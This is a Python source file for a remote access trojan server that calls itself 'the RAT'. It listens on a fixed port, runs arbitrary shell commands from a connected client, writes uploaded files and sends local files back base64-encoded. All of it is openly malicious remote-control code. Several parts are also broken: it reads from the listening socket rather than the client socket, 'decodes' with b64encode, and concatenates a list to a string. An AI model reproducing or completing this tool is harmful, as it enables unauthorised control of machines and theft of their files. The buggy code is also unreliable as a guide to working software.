import os
import sys
import base64
import socket
import subprocess

# Constants
HEADERSIZE = 10
PORT = 64209

def retrieveMessage(s):
    '''
    Retrieves a message from the socket stream
    
    Parameters: s - The socket stream
    
    Returns: The message received from the socket stream
    '''
    newMessage = True
    fullMessage = ""
    while True:
        msg = s.recv(16)
        if newMessage:
            print(f"new message length = {msg[:HEADERSIZE]}")
            msgLength = int(msg[:HEADERSIZE])
            newMessage = False
        fullMessage += msg.decode("UTF-8")
        if len(fullMessage)-HEADERSIZE == msgLength:
            print("Full message received...")
            print(fullMessage[HEADERSIZE:])
            return fullMessage

### Execute ###
def Execute(command):
    '''
    Executes a command on the server
    
    Parameters: command - The command to execute
    
    Returns: None
    '''
    try:
        subprocess.call(command, shell=True)
    except Exception as e:
        print(e)
    
### Upload ###
def Upload(b64String, outputFile):
    '''
    Uploads a file to the server
    
    Parameters: b64String - The base64 encoded string of the file
                outputFile - The name of the file to save
                
    Returns: None
    '''    
    # Decode the base64 string
    OutputText = base64.b64encode(b64String)
    # Write the file to the server
    try:
        with outputFile as OutputFile:
            OutputFile.write(OutputText)
    except Exception as e:
        print(e)
    

    
### Download ###
def Download(fileName):
    '''
    Downloads a file from the server
    
    Parameters: fileName - The name of the file to download
    
    Returns: The base64 encoded string of the file
    '''
    OutputText = ""
    try:
        with open(fileName, "rb") as localFile:
            OutputText = base64.b64encode(localFile.read())
            print(OutputText)
    except Exception as e:
        print(e)
        
    return OutputText

# Main code
def main():
    # Start Socket stream
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind socket to current host along port
    s.bind((socket.gethostname(), PORT))
    # Start listening for a connection with a queue of 1
    s.listen(1)
    while True:
        # accept any incomming socket connection request
        clientsocket, address = s.accept()
        
        print(f"Found connection at {address}! Connection successful!")
        messageForClient = "Welcome to the RAT :)"
        messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
        clientsocket.send(bytes(messageForClient, "UTF-8"))
        
        msg = retrieveMessage(s)
        
        # Send message to client)
        
        # Parse the command from the client
        command = msg.split()[0]
        if "execute" in command:
            command = msg.split()[1:]
            Execute(command)
        elif "upload" in command:
            b64String = msg.split()[1]
            outputFile = msg.split()[2]
            Upload(b64String, outputFile)
        elif "download" in command:
            # Get a list of files in the current directory
            fileList = os.listdir()

            print(fileList)
            
            # Send the list of files back to the client
            messageForClient = f'{len(fileList):<{HEADERSIZE}}' + fileList
            clientsocket.send(bytes(messageForClient, "UTF-8"))

            # Receive the file name chosen by the client
            fileName = retrieveMessage(s)
            fileName = fileName.decode("utf-8")

            # Download the file and send it back to the client
            OutputText = Download(fileName)
            messageForClient = f'{len(OutputText):<{HEADERSIZE}}' + OutputText
            clientsocket.send(bytes(messageForClient, "UTF-8"))

if __name__ == '__main__':
    main()
